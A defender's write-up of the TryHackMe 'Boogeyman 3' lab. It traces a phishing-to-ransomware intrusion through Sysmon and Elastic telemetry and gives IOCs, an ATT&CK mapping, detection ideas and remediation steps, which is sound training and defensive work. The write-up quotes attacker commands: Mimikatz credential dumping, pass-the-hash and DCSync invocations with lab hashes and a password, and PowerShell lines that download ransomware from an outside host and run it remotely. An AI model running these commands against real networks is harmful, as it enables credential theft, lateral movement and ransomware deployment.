# TryHackMe --- Boogeyman 3

## Incident Response / Threat Hunting Write-Up

> **Platform:** TryHackMe\
> **Room:** Boogeyman 3\
> **Focus:** Phishing, endpoint investigation, C2, persistence,
> credential dumping, Pass-the-Hash, lateral movement, DCSync,
> ransomware\
> **Primary telemetry:** Elastic / Kibana, Sysmon\
> **Incident window:** August 29--30, 2023

------------------------------------------------------------------------

## Executive Summary

Quick Logistics LLC received a phishing report from CEO Evan Hutchinson
after he opened a suspicious attachment. Although the attachment
appeared to do nothing, endpoint telemetry showed that it initiated a
multi-stage compromise.

I used Elastic/Kibana and Sysmon telemetry to reconstruct the attack
chronologically. The attacker delivered a disguised ISO containing an
HTA payload, implanted a DLL masquerading as a `.dat` file, established
scheduled-task persistence, and initiated command-and-control traffic.
After discovering that the compromised user had local administrator
privileges, the attacker escalated execution, downloaded Mimikatz,
dumped credentials, and used Pass-the-Hash to expand access.

The attacker then accessed a remote SMB share, recovered plaintext
credentials from an automation script, and used PowerShell Remoting to
compromise another workstation. From there, additional credentials were
dumped and access progressed to the domain controller. The attacker
ultimately performed DCSync credential theft and downloaded ransomware
for deployment across compromised systems.

The investigation demonstrated a progression from **initial access to
domain compromise and ransomware impact**.

------------------------------------------------------------------------

## Initial Evidence

The reported phishing email targeted Quick Logistics CEO **Evan
Hutchinson**.

The attachment appeared in the victim's Downloads directory as:

``` text
ProjectFinancialSummary_Q3.pdf
```

Windows identified the downloaded object as a **Disc Image File**,
despite its PDF-looking name.

After the image was mounted, another file with the same displayed name
appeared on the mounted `D:` drive. Windows identified that object as an
**HTML Application**, indicating an HTA-based execution mechanism.

This established the initial suspected chain:

``` text
Phishing email
    |
    v
Disguised ISO attachment
    |
    v
Mounted D: drive
    |
    v
HTML Application / HTA
    |
    v
mshta.exe
```

------------------------------------------------------------------------

# Investigation Timeline

## 1. Stage-1 Payload Implantation

I began by investigating process-creation telemetry around the time the
malicious attachment was executed.

A Sysmon process event revealed `xcopy.exe` copying a file named
`review.dat` from the mounted image into Evan's local Temp directory:

``` cmd
"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat
```

The command showed that the stage-1 payload attempted to implant the
file outside of the mounted ISO.

Important `xcopy` switches:

-   `/s` --- copy directories and subdirectories except empty ones
-   `/i` --- assume the destination is a directory when ambiguous
-   `/e` --- include empty directories
-   `/h` --- include hidden and system files

Immediately afterward, telemetry showed:

``` cmd
"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer
```

Although the payload used a `.dat` extension, execution through
`rundll32.exe` and the `DllRegisterServer` export strongly indicated
that `review.dat` was actually a DLL or DLL-compatible malicious payload
disguised as a data file.

### Finding

``` text
Stage-1 implanted payload: review.dat
Destination: %LOCALAPPDATA%\Temp\review.dat
Execution mechanism: rundll32.exe
```

------------------------------------------------------------------------

## 2. Scheduled Task Persistence

The next process event showed PowerShell creating a scheduled task.

The malicious script constructed a scheduled-task action that executed:

``` text
rundll32.exe
```

with the argument:

``` text
C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer
```

It then configured a daily trigger for `06:00` and registered the task:

``` powershell
Register-ScheduledTask Review -InputObject $D -Force
```

### Finding

``` text
Scheduled task: Review
Trigger: Daily at 06:00
Payload: review.dat
```

### MITRE ATT&CK

**T1053.005 --- Scheduled Task/Job: Scheduled Task**

The scheduled task allowed the malicious DLL to execute repeatedly after
the initial compromise.

------------------------------------------------------------------------

## 3. Command-and-Control Beaconing

After identifying the implanted payload, I pivoted from process events
to Sysmon network connection events.

I filtered for:

``` text
Event ID 3
Process: rundll32.exe
```

The resulting events showed repeated outbound connections from
`rundll32.exe` to:

``` text
165.232.170.151:80
```

Connections occurred every few seconds, which was consistent with
beaconing behavior.

### Finding

``` text
C2: 165.232.170.151:80
Process: rundll32.exe
```

The process-to-network correlation tied the disguised `review.dat`
payload directly to the suspected command-and-control infrastructure.

------------------------------------------------------------------------

## 4. Privilege Escalation / UAC Bypass

After C2 was established, I followed child-process activity originating
from the malicious `rundll32.exe` process.

The telemetry showed the attacker discovering that the compromised
context had local administrative access and subsequently attempting to
bypass UAC using a trusted Windows process.

This portion of the investigation was identified by correlating:

``` text
process.parent.name: rundll32.exe
```

with subsequent process-creation events and privilege changes.

### MITRE ATT&CK

**T1548.002 --- Abuse Elevation Control Mechanism: Bypass User Account
Control**

------------------------------------------------------------------------

## 5. Mimikatz Download

After obtaining elevated execution, the attacker moved into credential
access.

Searching Elastic for process command lines containing `github` revealed
PowerShell downloading Mimikatz:

``` powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile mimi.zip"
```

The attacker used the PowerShell alias:

``` text
iwr
```

for `Invoke-WebRequest`.

### Finding

``` text
https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
```

### MITRE ATT&CK

**T1105 --- Ingress Tool Transfer**\
**T1003 --- OS Credential Dumping**

------------------------------------------------------------------------

## 6. Credential Dumping

Mimikatz was subsequently executed with:

``` text
privilege::debug sekurlsa::logonpasswords
```

This is a strong indicator of credential dumping from Windows
authentication material.

The attacker recovered the following credential material:

``` text
User: itadmin
NTLM: F84769D250EB95EB2D7D8B4A1C5613F2
```

------------------------------------------------------------------------

## 7. Pass-the-Hash

The attacker did not need to recover the plaintext password for
`itadmin`.

Instead, Mimikatz was used to create a new authentication context using
the NTLM hash:

``` text
sekurlsa::pth /user:itadmin /domain:QUICKLOGISTICS /ntlm:F84769D250EB95EB2D7D8B4A1C5613F2 /run:powershell.exe
```

### Compromised Credential

``` text
itadmin:F84769D250EB95EB2D7D8B4A1C5613F2
```

### MITRE ATT&CK

**T1550.002 --- Use Alternate Authentication Material: Pass the Hash**

This was a major turning point in the intrusion because the attacker
could authenticate to additional systems without knowing the account's
plaintext password.

------------------------------------------------------------------------

## 8. Remote Share Discovery and Access

After obtaining the `itadmin` authentication context, I investigated
PowerShell activity for remote file access.

A process event showed:

``` powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "cat FileSystem::\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1"
```

The attacker accessed:

``` text
\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1
```

### Finding

``` text
Remote host: WKSTN-1327
Share: ITFiles
File: IT_Automation.ps1
```

The PowerShell `cat` alias maps to `Get-Content`, showing that the
attacker read the contents of the automation script directly from the
remote SMB share.

### MITRE ATT&CK

**T1135 --- Network Share Discovery**

------------------------------------------------------------------------

## 9. Plaintext Credential Discovery

The contents of `IT_Automation.ps1` exposed another credential.

This became visible in subsequent PowerShell telemetry when the attacker
constructed a `PSCredential` object:

``` powershell
New-Object PSCredential -ArgumentList (
    "QUICKLOGISTICS\allan.smith",
    (ConvertTo-SecureString 'Tr!ckyP@ssw0rd987' -AsPlainText -Force)
)
```

### Credential Recovered

``` text
QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987
```

This illustrates the security risk of storing plaintext service or
automation credentials inside scripts located on accessible network
shares.

------------------------------------------------------------------------

## 10. PowerShell Remoting / Lateral Movement

The attacker immediately used the newly discovered credentials:

``` powershell
Invoke-Command -Credential $credential -ComputerName WKSTN-1327 -ScriptBlock {whoami}
```

### Target

``` text
WKSTN-1327
```

This confirmed an attempted lateral movement from the first compromised
workstation to `WKSTN-1327`.

On the remote machine, PowerShell Remoting activity was associated with:

``` text
wsmprovhost.exe
```

which acts as the Windows Remote Management host process for remote
PowerShell commands.

### MITRE ATT&CK

**T1021.006 --- Remote Services: Windows Remote Management**

The attack path now looked like:

``` text
Evan's workstation
      |
      v
Mimikatz
      |
      v
itadmin NTLM hash
      |
      v
Pass-the-Hash
      |
      v
Remote SMB share
      |
      v
IT_Automation.ps1
      |
      v
allan.smith plaintext credentials
      |
      v
PowerShell Remoting
      |
      v
WKSTN-1327
```

------------------------------------------------------------------------

## 11. Credential Dumping on the Second Machine

After compromising `WKSTN-1327`, Mimikatz appeared under:

``` text
C:\Users\allan.smith\Documents\mimi\x64\mimikatz.exe
```

The attacker again executed:

``` text
privilege::debug sekurlsa::logonpasswords
```

and recovered another NTLM credential.

### Newly Dumped Credential

``` text
administrator:00f80f2538dcb54e7adc715c0e7091ec
```

The attacker subsequently attempted to use this hash with:

``` text
sekurlsa::pth
```

demonstrating another Pass-the-Hash attempt.

------------------------------------------------------------------------

## 12. Domain Controller Compromise

The investigation eventually showed malicious activity on:

``` text
DC01.quicklogistics.org
```

At this stage, the compromise had progressed beyond workstation-level
access and into the Active Directory control plane.

The attacker downloaded and executed Mimikatz on the domain controller
before performing DCSync operations.

------------------------------------------------------------------------

## 13. DCSync Attack

Elastic process telemetry showed Mimikatz executing:

``` text
lsadump::dcsync /domain:quicklogistics.org /user:backupda
```

followed by:

``` text
lsadump::dcsync /domain:quicklogistics.org /user:administrator
```

### Additional Account Dumped

``` text
backupda
```

### MITRE ATT&CK

**T1003.006 --- OS Credential Dumping: DCSync**

DCSync is especially significant because an attacker with sufficient
Active Directory replication privileges can request password hashes
using domain replication functionality rather than directly dumping
credentials from LSASS.

At this point, the attacker had achieved a severe level of domain
compromise.

------------------------------------------------------------------------

## 14. Ransomware Download

After the DCSync activity, I searched process telemetry on `DC01` for
outbound HTTP/HTTPS download commands.

At approximately `01:53`, PowerShell executed:

``` powershell
iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe
```

### Ransomware URL

``` text
http://ff.sillytechninja.io/ransomboogey.exe
```

Subsequent events showed the attacker using PowerShell Remoting to
execute commands against `WKSTN-1327` and retrieve/execute the same
ransomware binary.

Example behavior included:

``` powershell
Invoke-Command -ComputerName WKSTN-1327.quicklogistics.org -ScriptBlock {
    iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe
    .\ransomboogey.exe
}
```

### MITRE ATT&CK

**T1105 --- Ingress Tool Transfer**\
**T1021.006 --- Windows Remote Management**\
**T1486 --- Data Encrypted for Impact**

------------------------------------------------------------------------

# Attack Chain Summary

``` text
Spearphishing Attachment
        |
        v
Disguised ISO
        |
        v
HTA / mshta.exe
        |
        v
review.dat implanted
        |
        +------------------------------+
        |                              |
        v                              v
Scheduled Task "Review"          rundll32.exe
Persistence                            |
                                       v
                             165.232.170.151:80
                                  C2 Beacon
                                       |
                                       v
                                  UAC Bypass
                                       |
                                       v
                              Mimikatz Download
                                       |
                                       v
                              Credential Dumping
                                       |
                                       v
                          itadmin NTLM credential
                                       |
                                       v
                                Pass-the-Hash
                                       |
                                       v
                         SMB Share Enumeration
                                       |
                                       v
                    ITFiles\IT_Automation.ps1
                                       |
                                       v
                     Plaintext allan.smith creds
                                       |
                                       v
                           PowerShell Remoting
                                       |
                                       v
                                 WKSTN-1327
                                       |
                                       v
                           Credential Dumping
                                       |
                                       v
                        Administrator NTLM hash
                                       |
                                       v
                                    DC01
                                       |
                                       v
                                   DCSync
                              /             \
                         backupda       administrator
                              \             /
                                       v
                              Ransomware Download
                                       |
                                       v
                               ransomboogey.exe
                                       |
                                       v
                           Remote Ransomware Execution
```

------------------------------------------------------------------------

# Indicators of Compromise

## Network

  Type              Indicator
  ----------------- ------------------------------------------------
  C2 IP             `165.232.170.151`
  C2 Port           `80`
  Ransomware Host   `ff.sillytechninja.io`
  Ransomware URL    `http://ff.sillytechninja.io/ransomboogey.exe`

## Files

  -----------------------------------------------------------------------
  Artifact                            Purpose
  ----------------------------------- -----------------------------------
  `ProjectFinancialSummary_Q3.pdf`    Disguised phishing/ISO payload

  `review.dat`                        Implanted malicious DLL-like
                                      payload

  `mimi.zip`                          Mimikatz archive

  `IT_Automation.ps1`                 Remote automation script containing
                                      exposed credentials

  `ransomboogey.exe`                  Ransomware payload
  -----------------------------------------------------------------------

## Processes / LOLBins

``` text
mshta.exe
xcopy.exe
rundll32.exe
powershell.exe
mimikatz.exe
wsmprovhost.exe
```

## Persistence

``` text
Scheduled Task: Review
Trigger: Daily at 06:00
```

## Compromised Credentials Observed

``` text
itadmin:F84769D250EB95EB2D7D8B4A1C5613F2

QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987

administrator:00f80f2538dcb54e7adc715c0e7091ec
```

> These credentials originate from the TryHackMe lab environment and are
> included only as investigation artifacts.

------------------------------------------------------------------------

# MITRE ATT&CK Mapping

  ----------------------------------------------------------------------------
  Technique               ID                      Evidence
  ----------------------- ----------------------- ----------------------------
  Spearphishing           T1566.001               Malicious attachment
  Attachment                                      delivered to CEO

  User Execution:         T1204.002               Victim opened malicious
  Malicious File                                  attachment

  Signed Binary Proxy     T1218.005               HTA execution through
  Execution: Mshta                                `mshta.exe`

  Scheduled Task/Job      T1053.005               `Review` scheduled task

  Application Layer       T1071                   C2 traffic over HTTP
  Protocol                                        

  Bypass User Account     T1548.002               UAC bypass attempt
  Control                                         

  Ingress Tool Transfer   T1105                   Mimikatz and ransomware
                                                  downloads

  OS Credential Dumping   T1003                   Mimikatz
                                                  `sekurlsa::logonpasswords`

  Pass the Hash           T1550.002               `sekurlsa::pth`

  Network Share Discovery T1135                   Remote share
                                                  enumeration/access

  Windows Remote          T1021.006               `Invoke-Command` lateral
  Management                                      movement

  DCSync                  T1003.006               `lsadump::dcsync`

  Data Encrypted for      T1486                   Ransomware deployment
  Impact                                          
  ----------------------------------------------------------------------------

------------------------------------------------------------------------

# Detection Opportunities

Several behaviors in this intrusion provide strong detection
opportunities.

### Suspicious `rundll32.exe` Usage

Alert when `rundll32.exe` executes unusual extensions or payloads from
user-writable locations:

``` text
%TEMP%
%APPDATA%
%LOCALAPPDATA%
Downloads
```

Execution resembling:

``` text
rundll32.exe review.dat,DllRegisterServer
```

should receive additional scrutiny.

### Repeated Network Connections from LOLBins

`rundll32.exe` repeatedly connecting to the same external IP every few
seconds is a strong behavioral C2 signal.

Useful correlation:

``` text
Process: rundll32.exe
Destination: External IP
Repeated connections: Yes
Interval: Short / regular
```

### PowerShell Download Activity

Monitor PowerShell command lines containing:

``` text
Invoke-WebRequest
iwr
DownloadFile
WebClient
```

especially when retrieving executables or known offensive-security
tooling.

### Mimikatz Indicators

High-confidence command-line indicators include:

``` text
sekurlsa::logonpasswords
sekurlsa::pth
lsadump::dcsync
privilege::debug
```

### Remote PowerShell

Monitor unusual:

``` text
Invoke-Command
New-PSSession
Enter-PSSession
wsmprovhost.exe
```

activity between workstations or from administrative systems where such
behavior is uncommon.

### Plaintext Credentials in Scripts

Automation scripts should never contain reusable plaintext credentials.

Secrets should instead be stored in managed credential systems such as
vaults or platform-specific secret stores with tightly controlled
access.

------------------------------------------------------------------------

# Remediation Recommendations

1.  **Block identified malicious infrastructure** and investigate
    historical connections to the C2 IP and ransomware domain.
2.  **Isolate affected endpoints**, including the original CEO
    workstation, `WKSTN-1327`, and any systems contacted during the
    lateral-movement window.
3.  **Reset compromised credentials**, including privileged accounts
    exposed through Mimikatz or automation scripts.
4.  **Invalidate active sessions and Kerberos tickets** associated with
    compromised identities.
5.  **Investigate Active Directory replication privileges** after
    confirmed DCSync activity.
6.  **Rotate highly privileged domain credentials** according to the
    organization's domain-compromise recovery procedure.
7.  **Remove plaintext credentials from automation scripts** and migrate
    them into a managed secrets solution.
8.  **Review PowerShell Remoting and WinRM access controls** and
    restrict remote administration to approved management paths.
9.  **Hunt enterprise-wide for the observed payload names, hashes,
    scheduled task, domains, IP addresses, and command-line patterns.**
10. **Review email security controls** for ISO/HTA delivery and
    strengthen attachment filtering where operationally appropriate.

------------------------------------------------------------------------

# Key Takeaways

The most important lesson from this investigation was the value of
**following the attack chain rather than investigating alerts
independently**.

A suspicious `xcopy.exe` event initially looked like a simple file
operation. Correlating it with the surrounding telemetry showed:

``` text
xcopy
  -> rundll32
  -> scheduled task
  -> network beaconing
  -> privilege escalation
  -> Mimikatz
  -> Pass-the-Hash
  -> remote share access
  -> plaintext credential discovery
  -> PowerShell Remoting
  -> additional credential dumping
  -> domain controller compromise
  -> DCSync
  -> ransomware
```

The investigation also demonstrated why full command-line telemetry is
extremely valuable. Several major findings---including persistence
configuration, Mimikatz usage, stolen hashes, plaintext credentials,
lateral-movement targets, DCSync commands, and the ransomware URL---were
recoverable directly from process-creation events.

Boogeyman 3 provided a realistic example of how an attacker can turn one
successful phishing execution into a full Active Directory compromise by
chaining credential theft, credential reuse, lateral movement, and
legitimate Windows administration tooling.

------------------------------------------------------------------------

## Skills Demonstrated

-   Elastic/Kibana threat hunting
-   Sysmon event analysis
-   Windows process-tree analysis
-   Command-line analysis
-   C2 identification
-   Persistence analysis
-   PowerShell investigation
-   Credential-access investigation
-   Pass-the-Hash analysis
-   SMB/network-share investigation
-   PowerShell Remoting analysis
-   Active Directory attack analysis
-   DCSync identification
-   Ransomware incident reconstruction
-   MITRE ATT&CK mapping
-   IOC extraction
-   Incident timeline reconstruction

------------------------------------------------------------------------

*This write-up documents activity performed in an authorized TryHackMe
training environment. Credentials, hashes, hosts, and malicious
infrastructure listed above are lab artifacts and are included for
educational and defensive-security purposes.*
